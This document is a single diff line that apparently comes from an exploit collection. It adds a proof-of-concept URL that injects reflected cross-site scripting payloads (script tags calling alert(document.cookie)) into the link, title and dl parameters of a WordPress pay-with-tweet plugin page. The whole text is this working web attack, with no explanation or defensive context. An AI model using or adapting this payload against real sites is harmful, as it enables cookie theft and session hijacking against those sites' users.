@@ -1,0 +1,1 @@
+http://www.example.com/wp-content/plugins/pay-with-tweet.php/pay.php?link=%22&gt;&lt;/input&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&amp;title=&lt;script&gt;alert(document.cookie)&lt;/script&gt;&amp;dl=http://brindi.si%27&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
